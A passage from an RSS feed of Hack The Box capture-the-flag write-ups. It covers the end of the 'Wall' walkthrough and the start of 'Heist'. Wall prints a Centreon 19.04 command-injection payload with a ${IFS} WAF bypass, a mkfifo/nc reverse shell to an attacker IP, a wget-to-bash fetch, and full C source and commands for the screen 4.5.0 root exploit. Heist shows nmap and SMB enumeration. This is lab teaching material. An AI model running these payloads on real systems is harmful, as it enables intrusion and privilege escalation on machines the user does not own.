www-data</h2><p>I checked the version of <code>centreon</code> and it was <code>19.04</code>:<br><img src="/images/hackthebox/wall/6.png" alt=""><br>It was vulnerable to <code>RCE</code> (<code>CVE-2019-13024</code>, discovered by the <a href="https://github.com/mhaskar" target="_blank" rel="noopener">author of the box</a>) and there was an exploit for it:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;wall# searchsploit centreon</span><br><span class="line">-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                                                                                                                                                                    |  Path</span><br><span class="line">                                                                                                                                                                                                  | (&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;)</span><br><span class="line">-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">----------</span><br><span class="line"> Redacted</span><br><span class="line">----------</span><br><span class="line">Centreon 19.04  - Remote Code Execution                                                                                                                                                           | exploits&#x2F;php&#x2F;webapps&#x2F;47069.py</span><br><span class="line">----------</span><br><span class="line"> Redacted</span><br><span class="line">----------</span><br><span class="line">-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">Shellcodes: No Result</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;wall#</span><br></pre></td></tr></table></figure><p>But when I tried to run the exploit I didn’t get a shell:<br><img src="/images/hackthebox/wall/7.png" alt=""></p><p>So I started looking at the exploit code and tried to do it manually.<br>The vulnerability is in the poller configuration page (<code>/main.get.php?p=60901</code>) :</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poller_configuration_page = url + <span class="string">"/main.get.php?p=60901"</span></span><br></pre></td></tr></table></figure><p>The script attempts to configure a poller and this is the payload that’s sent in the <code>POST</code> request:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">payload_info = &#123;</span><br><span class="line">    <span class="string">"name"</span>: <span class="string">"Central"</span>,</span><br><span class="line">    <span class="string">"ns_ip_address"</span>: <span class="string">"127.0.0.1"</span>,</span><br><span class="line">    <span class="comment"># this value should be 1 always</span></span><br><span class="line">    <span class="string">"localhost[localhost]"</span>: <span class="string">"1"</span>,</span><br><span class="line">    <span class="string">"is_default[is_default]"</span>: <span class="string">"0"</span>,</span><br><span class="line">    <span class="string">"remote_id"</span>: <span class="string">""</span>,</span><br><span class="line">    <span class="string">"ssh_port"</span>: <span class="string">"22"</span>,</span><br><span class="line">    <span class="string">"init_script"</span>: <span class="string">"centengine"</span>,</span><br><span class="line">    <span class="comment"># this value contains the payload , you can change it as you want</span></span><br><span class="line">    <span class="string">"nagios_bin"</span>: <span class="string">"ncat -e /bin/bash &#123;0&#125; &#123;1&#125; #"</span>.format(ip, port),</span><br><span class="line">    <span class="string">"nagiostats_bin"</span>: <span class="string">"/usr/sbin/centenginestats"</span>,</span><br><span class="line">    <span class="string">"nagios_perfdata"</span>: <span class="string">"/var/log/centreon-engine/service-perfdata"</span>,</span><br><span class="line">    <span class="string">"centreonbroker_cfg_path"</span>: <span class="string">"/etc/centreon-broker"</span>,</span><br><span class="line">    <span class="string">"centreonbroker_module_path"</span>: <span class="string">"/usr/share/centreon/lib/centreon-broker"</span>,</span><br><span class="line">    <span class="string">"centreonbroker_logs_path"</span>: <span class="string">""</span>,</span><br><span class="line">    <span class="string">"centreonconnector_path"</span>: <span class="string">"/usr/lib64/centreon-connector"</span>,</span><br><span class="line">    <span class="string">"init_script_centreontrapd"</span>: <span class="string">"centreontrapd"</span>,</span><br><span class="line">    <span class="string">"snmp_trapd_path_conf"</span>: <span class="string">"/etc/snmp/centreon_traps/"</span>,</span><br><span class="line">    <span class="string">"ns_activate[ns_activate]"</span>: <span class="string">"1"</span>,</span><br><span class="line">    <span class="string">"submitC"</span>: <span class="string">"Save"</span>,</span><br><span class="line">    <span class="string">"id"</span>: <span class="string">"1"</span>,</span><br><span class="line">    <span class="string">"o"</span>: <span class="string">"c"</span>,</span><br><span class="line">    <span class="string">"centreon_token"</span>: poller_token,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>nagios_bin</code> is the vulnerable parameter:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># this value contains the payload , you can change it as you want</span></span><br><span class="line"><span class="string">"nagios_bin"</span>: <span class="string">"ncat -e /bin/bash &#123;0&#125; &#123;1&#125; #"</span>.format(ip, port),</span><br></pre></td></tr></table></figure><p>I checked the configuration page and looked at the <code>HTML</code> source, <code>nagios_bin</code> is the monitoring engine binary, I tried to inject a command there:<br><img src="/images/hackthebox/wall/8.png" alt=""></p><p>When I tried to save the configuration I got a <code>403</code>:<br><img src="/images/hackthebox/wall/9.png" alt=""><br>That’s because there’s a <code>WAF</code> blocking these attempts, I could bypass the <code>WAF</code> by replacing the spaces in the commands with <a href="https://en.wikipedia.org/wiki/Internal_field_separator" target="_blank" rel="noopener"><code>${IFS}</code></a>. I saved the reverse shell payload in a file then I used <code>wget</code> to get the file contents and I piped it to <code>bash</code>.<br><code>a</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 10.10.xx.xx 1337 &gt;&#x2F;tmp&#x2F;f</span><br></pre></td></tr></table></figure><p>modified parameter:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"nagios_bin"</span>: <span class="string">"wget$&#123;IFS&#125;-qO-$&#123;IFS&#125;http://10.10.xx.xx/a$&#123;IFS&#125;|$&#123;IFS&#125;bash;"</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;wall# python exploit.py http:&#x2F;&#x2F;wall.htb&#x2F;centreon&#x2F; admin password1 10.10.xx.xx 1337</span><br><span class="line">[+] Retrieving CSRF token to submit the login form</span><br><span class="line">exploit.py:38: UserWarning: No parser was explicitly specified, so I&#39;m using the best available HTML parser for this system (&quot;lxml&quot;). This usually isn&#39;t a problem, but if you run this code on another system, or in a different virtual e</span><br><span class="line">nvironment, it may use a different parser and behave differently.</span><br><span class="line"></span><br><span class="line">The code that caused this warning is on line 38 of the file exploit.py. To get rid of this warning, pass the additional argument &#39;features&#x3D;&quot;lxml&quot;&#39; to the BeautifulSoup constructor.</span><br><span class="line"></span><br><span class="line">  soup &#x3D; BeautifulSoup(html_content)</span><br><span class="line">[+] Login token is : ba28f431a995b4461731fb394eb01d79</span><br><span class="line">[+] Logged In Sucssfully</span><br><span class="line">[+] Retrieving Poller token</span><br><span class="line">exploit.py:56: UserWarning: No parser was explicitly specified, so I&#39;m using the best available HTML parser for this system (&quot;lxml&quot;). This usually isn&#39;t a problem, but if you run this code on another system, or in a different virtual e</span><br><span class="line">nvironment, it may use a different parser and behave differently.</span><br><span class="line"></span><br><span class="line">The code that caused this warning is on line 56 of the file exploit.py. To get rid of this warning, pass the additional argument &#39;features&#x3D;&quot;lxml&quot;&#39; to the BeautifulSoup constructor.</span><br><span class="line"></span><br><span class="line">  poller_soup &#x3D; BeautifulSoup(poller_html)</span><br><span class="line">[+] Poller token is : d5702ae3de1264b0692afcef86074f07</span><br><span class="line">[+] Injecting Done, triggering the payload</span><br><span class="line">[+] Check your netcat listener !</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;wall# nc -lvnp 1337</span><br><span class="line">listening on [any] 1337 ...</span><br><span class="line">connect to [10.10.xx.xx] from (UNKNOWN) [10.10.10.157] 37862</span><br><span class="line">&#x2F;bin&#x2F;sh: 0: can&#39;t access tty; job control turned off</span><br><span class="line">$ whoami</span><br><span class="line">www-data</span><br><span class="line">$ which python             </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;python</span><br><span class="line">$ python -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;</span><br><span class="line">www-data@Wall:&#x2F;usr&#x2F;local&#x2F;centreon&#x2F;www$ ^Z</span><br><span class="line">[1]+  Stopped                 nc -lvnp 1337</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;wall# stty raw -echo </span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;wall# nc -lvnp 1337</span><br><span class="line"></span><br><span class="line">www-data@Wall:&#x2F;usr&#x2F;local&#x2F;centreon&#x2F;www$ export TERM&#x3D;screen</span><br><span class="line">www-data@Wall:&#x2F;usr&#x2F;local&#x2F;centreon&#x2F;www$</span><br></pre></td></tr></table></figure><h2 id="Screen-4-5-0-–-gt-Root-Shell-–-gt-User-amp-Root-Flags"><a href="#Screen-4-5-0-–-gt-Root-Shell-–-gt-User-amp-Root-Flags" class="headerlink" title="Screen 4.5.0 –&gt; Root Shell –&gt; User &amp; Root Flags"></a>Screen 4.5.0 –&gt; Root Shell –&gt; User &amp; Root Flags</h2><p>There were two users on the box, <code>shelby</code> and <code>sysmonitor</code>. I couldn’t read the user flag as <code>www-data</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">www-data@Wall:&#x2F;usr&#x2F;local&#x2F;centreon&#x2F;www$ cd &#x2F;home</span><br><span class="line">www-data@Wall:&#x2F;home$ ls -al</span><br><span class="line">total 16</span><br><span class="line">drwxr-xr-x  4 root       root       4096 Jul  4 00:38 .</span><br><span class="line">drwxr-xr-x 23 root       root       4096 Jul  4 00:25 ..</span><br><span class="line">drwxr-xr-x  6 shelby     shelby     4096 Jul 30 17:37 shelby</span><br><span class="line">drwxr-xr-x  5 sysmonitor sysmonitor 4096 Jul  6 15:07 sysmonitor</span><br><span class="line">www-data@Wall:&#x2F;home$ cd shelby</span><br><span class="line">www-data@Wall:&#x2F;home&#x2F;shelby$ cat user.txt </span><br><span class="line">cat: user.txt: Permission denied</span><br><span class="line">www-data@Wall:&#x2F;home&#x2F;shelby$</span><br></pre></td></tr></table></figure><p>I searched for <code>suid</code> binaries and saw <code>screen-4.5.0</code>, similar to the privesc in <a href="/hack-the-box/flujab">Flujab</a> I used <a href="https://www.exploit-db.com/exploits/41154" target="_blank" rel="noopener">this exploit</a>.<br>The exploit script didn’t work properly so I did it manually, I compiled the binaries on my box:<br><code>libhax.c</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dropshell</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    chown(<span class="string">"/tmp/rootshell"</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    chmod(<span class="string">"/tmp/rootshell"</span>, <span class="number">04755</span>);</span><br><span class="line">    unlink(<span class="string">"/etc/ld.so.preload"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] done!\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>rootshell.c</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    seteuid(<span class="number">0</span>);</span><br><span class="line">    setegid(<span class="number">0</span>);</span><br><span class="line">    execvp(<span class="string">"/bin/sh"</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/HTB/boxes/wall/privesc<span class="meta"># nano libhax.c</span></span><br><span class="line">root@kali:~/Desktop/HTB/boxes/wall/privesc<span class="meta"># nano rootshell.c</span></span><br><span class="line">root@kali:~/Desktop/HTB/boxes/wall/privesc<span class="meta"># gcc -fPIC -shared -ldl -o libhax.so libhax.c</span></span><br><span class="line">libhax.c: In function ‘dropshell’:</span><br><span class="line">libhax.c:<span class="number">7</span>:<span class="number">5</span>: warning: implicit declaration of function ‘chmod’ [-Wimplicit-function-declaration]</span><br><span class="line">    <span class="number">7</span> |     chmod(<span class="string">"/tmp/rootshell"</span>, <span class="number">04755</span>);</span><br><span class="line">      |     ^~~~~</span><br><span class="line">root@kali:~/Desktop/HTB/boxes/wall/privesc<span class="meta"># gcc -o rootshell rootshell.c</span></span><br><span class="line">rootshell.c: In function ‘main’:</span><br><span class="line">rootshell.c:<span class="number">3</span>:<span class="number">5</span>: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]</span><br><span class="line">    <span class="number">3</span> |     setuid(<span class="number">0</span>);</span><br><span class="line">      |     ^~~~~~</span><br><span class="line">rootshell.c:<span class="number">4</span>:<span class="number">5</span>: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]</span><br><span class="line">    <span class="number">4</span> |     setgid(<span class="number">0</span>);</span><br><span class="line">      |     ^~~~~~</span><br><span class="line">rootshell.c:<span class="number">5</span>:<span class="number">5</span>: warning: implicit declaration of function ‘seteuid’ [-Wimplicit-function-declaration]</span><br><span class="line">    <span class="number">5</span> |     seteuid(<span class="number">0</span>);</span><br><span class="line">      |     ^~~~~~~</span><br><span class="line">rootshell.c:<span class="number">6</span>:<span class="number">5</span>: warning: implicit declaration of function ‘setegid’ [-Wimplicit-function-declaration]</span><br><span class="line">    <span class="number">6</span> |     setegid(<span class="number">0</span>);</span><br><span class="line">      |     ^~~~~~~</span><br><span class="line">rootshell.c:<span class="number">7</span>:<span class="number">5</span>: warning: implicit declaration of function ‘execvp’ [-Wimplicit-function-declaration]</span><br><span class="line">    <span class="number">7</span> |     execvp(<span class="string">"/bin/sh"</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">      |     ^~~~~~</span><br><span class="line">rootshell.c:<span class="number">7</span>:<span class="number">5</span>: warning: too many arguments to built-in function ‘execvp’ expecting <span class="number">2</span> [-Wbuiltin-declaration-mismatch]</span><br><span class="line">root@kali:~/Desktop/HTB/boxes/wall/privesc#</span><br></pre></td></tr></table></figure><p>Then I uploaded them to the box and did the rest of the exploit:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">www-data@Wall:&#x2F;home&#x2F;shelby$ cd &#x2F;tmp&#x2F;</span><br><span class="line">www-data@Wall:&#x2F;tmp$ wget http:&#x2F;&#x2F;10.10.xx.xx&#x2F;libhax.so</span><br><span class="line">--2019-12-07 00:23:12--  http:&#x2F;&#x2F;10.10.xx.xx&#x2F;libhax.so</span><br><span class="line">Connecting to 10.10.xx.xx:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 16144 (16K) [application&#x2F;octet-stream]</span><br><span class="line">Saving to: &#39;libhax.so&#39;</span><br><span class="line"></span><br><span class="line">libhax.so           100%[&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;]  15.77K  11.7KB&#x2F;s    in 1.3s    </span><br><span class="line"></span><br><span class="line">2019-12-07 00:23:14 (11.7 KB&#x2F;s) - &#39;libhax.so&#39; saved [16144&#x2F;16144]</span><br><span class="line"></span><br><span class="line">www-data@Wall:&#x2F;tmp$ wget http:&#x2F;&#x2F;10.10.xx.xx&#x2F;rootshell</span><br><span class="line">--2019-12-07 00:23:20--  http:&#x2F;&#x2F;10.10.xx.xx&#x2F;rootshell</span><br><span class="line">Connecting to 10.10.xx.xx:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 16832 (16K) [application&#x2F;octet-stream]</span><br><span class="line">Saving to: &#39;rootshell&#39;</span><br><span class="line"></span><br><span class="line">rootshell           100%[&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;]  16.44K  16.3KB&#x2F;s    in 1.0s    </span><br><span class="line"></span><br><span class="line">2019-12-07 00:23:22 (16.3 KB&#x2F;s) - &#39;rootshell&#39; saved [16832&#x2F;16832]</span><br><span class="line"></span><br><span class="line">www-data@Wall:&#x2F;tmp$</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">www-data@Wall:&#x2F;tmp$ cd &#x2F;etc</span><br><span class="line">www-data@Wall:&#x2F;etc$ umask 000</span><br><span class="line">www-data@Wall:&#x2F;etc$ &#x2F;bin&#x2F;screen-4.5.0 -D -m -L ld.so.preload echo -ne  &quot;\x0a&#x2F;tmp&#x2F;libhax.so&quot;</span><br><span class="line">www-data@Wall:&#x2F;etc$ &#x2F;bin&#x2F;screen-4.5.0 -ls</span><br><span class="line">&#39; from &#x2F;etc&#x2F;ld.so.preload cannot be preloaded (cannot open shared object file): ignored.</span><br><span class="line">[+] done!</span><br><span class="line">No Sockets found in &#x2F;tmp&#x2F;screens&#x2F;S-www-data.</span><br><span class="line"></span><br><span class="line">www-data@Wall:&#x2F;etc$ &#x2F;tmp&#x2F;rootshell</span><br><span class="line"># whoami</span><br><span class="line">root</span><br><span class="line"># id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root),33(www-data),6000(centreon)</span><br><span class="line">#</span><br></pre></td></tr></table></figure><p><img src="/images/hackthebox/wall/10.png" alt=""><br>And we owned root !<br>That’s it , Feedback is appreciated !<br>Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener">@Ahm3d_H3sham</a><br>Thanks for reading.</p><p>Previous Hack The Box write-up : <a href="/hack-the-box/heist/">Hack The Box - Heist</a><br>Next Hack The Box write-up : <a href="/hack-the-box/smasher2/">Hack The Box - Smasher2</a></p>]]></content:encoded>
      
      <comments>https://0xrick.github.io/hack-the-box/wall/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Hack The Box - Heist</title>
      <link>https://0xrick.github.io/hack-the-box/heist/</link>
      <guid>https://0xrick.github.io/hack-the-box/heist/</guid>
      <pubDate>Sat, 30 Nov 2019 03:00:00 GMT</pubDate>
      <description>
      
        My write-up / walkthrough for Heist from Hack The Box.
      
      </description>
      
      
      <content:encoded><![CDATA[<h1 id="Hack-The-Box-Heist"><a href="#Hack-The-Box-Heist" class="headerlink" title="Hack The Box - Heist"></a>Hack The Box - Heist</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>Hey guys, today Heist retired and here’s my write-up about it. It’s an easy Windows machine and its ip is <code>10.10.10.149</code>, I added it to <code>/etc/hosts</code> as <code>heist.htb</code>. Let’s jump right in !<br><img src="/images/hackthebox/heist/0.png" alt=""></p><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>As always we will start with <code>nmap</code> to scan for open ports and services:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;heist# nmap -sV -sT -sC -o nmapinitial heist.htb </span><br><span class="line">Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2019-11-29 12:01 EST</span><br><span class="line">Nmap scan report for heist.htb (10.10.10.149)</span><br><span class="line">Host is up (0.16s latency).</span><br><span class="line">Not shown: 997 filtered ports</span><br><span class="line">PORT    STATE SERVICE       VERSION</span><br><span class="line">80&#x2F;tcp  open  http          Microsoft IIS httpd 10.0</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   &#x2F;: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not set</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS&#x2F;10.0</span><br><span class="line">| http-title: Support Login Page</span><br><span class="line">|_Requested resource was login.php</span><br><span class="line">135&#x2F;tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">445&#x2F;tcp open  microsoft-ds?</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:&#x2F;o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: -1h59m59s</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2019-11-29T15:02:39</span><br><span class="line">|_  start_date: N&#x2F;A</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 80.49 seconds</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;heist#</span><br></pre></td></tr></table></figure><p>We got <code>smb</code> and <code>http</code> on port 80, I also ran another scan on port 5895 to see if <code>winrm</code> is running and it was: </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;heist# nmap -sV -sT -p 5985 heist.htb                           Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2019-11-29 12:05 EST                               Nmap scan report for heist.htb (10.10.10.149)                                                 Host is up (0.42s latency).                                                                   PORT     STATE SERVICE VERSION</span><br><span class="line">5985&#x2F;tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP&#x2F;UPnP)</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:&#x2F;o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 13.10 seconds</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;heist#</span><br></pre></td></tr></table></figure><p>Anonymous authentication wasn’t allowed on <code>smb</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;heist# smbclient --list &#x2F;&#x2F;heist.htb&#x2F; -U &quot;&quot;</span><br><span class="line">Enter WORKGROUP\&#39;s password: </span><br><span class="line">session setup failed: NT_STATUS_LOGON_FAILURE</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;heist#</span><br></pre></td></tr></table></figure><p>So let’s check the web service.</p><h2 id="Web-Enumeration"><a href="#Web-Enumeration" class="headerlink" title="Web Enumeration"></a>Web Enumeration</h2><p>The index page had a login form, however there was a guest login option:<br><img src="/images/hackthebox/heist/1.png" alt=""></p><p>After getting in as <code>guest</code> I got this issues page:<br><img src="/images/hackthebox/heist/2.png" alt=""><br>A user called <code>hazard</code> posted an issue that he’s having some problems with his <code>Cisco</code> router and he attached the configuration file with the issue.<br>The configuration file had some password hashes and usernames:<br><img src="/images/hackthebox/heist/3.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 